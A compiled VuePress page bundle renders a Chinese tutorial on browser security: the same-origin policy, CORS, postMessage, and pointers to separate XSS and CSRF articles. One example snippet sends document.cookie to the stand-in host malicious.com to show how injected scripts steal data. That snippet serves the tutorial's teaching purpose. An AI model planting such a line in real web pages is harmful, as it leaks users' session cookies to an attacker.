(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{432:function(t,s,a){"use strict";a.r(s);var n=a(56),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"浏览器安全"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浏览器安全"}},[t._v("#")]),t._v(" 浏览器安全")]),t._v(" "),a("p",[t._v("浏览器安全可以三大块-----web页面安全、浏览器网络安全和浏览器系统安全。")]),t._v(" "),a("h3",{attrs:{id:"同源策略"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#同源策略"}},[t._v("#")]),t._v(" 同源策略")]),t._v(" "),a("p",[t._v("协议、域名和端口都一样，这两个 URL 同源。")]),t._v(" "),a("p",[t._v("两个相同的源之间是互相访问资源和操作 DOM 的。如果不同的两个源相互访问会有一套基础的安全策略的制约。")]),t._v(" "),a("p",[t._v("同源策略主要表现在 DOM、Web数据和网络三个层面。")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("DOM 层面\n不同源 js 脚本对当前 DOM 对象读和写的操作.")])]),t._v(" "),a("li",[a("p",[t._v("数据层面\n同源策略限制了不同源的站点读取当前站点的 Cookie、indexDB、LocalStorage 等数据。")])]),t._v(" "),a("li",[a("p",[t._v("网络层面\n限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同的站点。")])])]),t._v(" "),a("h3",{attrs:{id:"安全和便利性的权衡"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安全和便利性的权衡"}},[t._v("#")]),t._v(" 安全和便利性的权衡")]),t._v(" "),a("p",[t._v("绝对的安全性会使得 Web 项目难以开发和使用. 来看看浏览器出让了哪些同源策的安全性。")]),t._v(" "),a("ol",[a("li",[t._v("页面中可以嵌入第三方资源\nWeb世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自同一个源，违背了Web初衷，也带来了诸多限制。比如将不同资源部署到CDN上，CDN上的资源就部署在另一个域名上，这就需要同源策略对页面的引入开一个口子，让其任意引用外部文件。")])]),t._v(" "),a("p",[t._v("但任意引入外来文件，也带来了文件，比如通过劫持浏览器的首页，然后注入恶意脚本。文件到达浏览器时，浏览器去执行，可能修改用户的需求.")]),t._v(" "),a("p",[t._v("还能够获取敏感数据，如 Cookie、IndexDB、LocalStorage 等数据通过 XSS 手段发给服务器。")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// index.js")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("onClick")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("let")]),t._v(" url "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token template-string"}},[a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("http://malicious.com?cookie = ")]),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("onClick")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("ol",{attrs:{start:"2"}},[a("li",[t._v("跨域资源共享和跨文档消息机制\n默认情况下，如果通过 XML 或 Fetch 来请求别的网站资源，同源策略会阻止发送请求，这样大大限制了我们。")])]),t._v(" "),a("p",[t._v("为了解决这个问题，引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。")]),t._v(" "),a("p",[t._v("如果不同源，无法相互操纵DOM。不过实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器引入了跨文档消息机制。可以通过 window.postMessage 的 js 接口和不同源 DOM 通信。")]),t._v(" "),a("h3",{attrs:{id:"xss攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击"}},[t._v("#")]),t._v(" XSS攻击")]),t._v(" "),a("p",[t._v("前面说了，页面支持第三方资源的引用和CORS也带来了问题。")]),t._v(" "),a("p",[t._v("请看文章 XSS 攻击篇。")]),t._v(" "),a("h3",{attrs:{id:"csrf攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf攻击"}},[t._v("#")]),t._v(" CSRF攻击")]),t._v(" "),a("p",[t._v("请看文章 CSRF 攻击篇。")])])}),[],!1,null,null,null);s.default=e.exports}}]);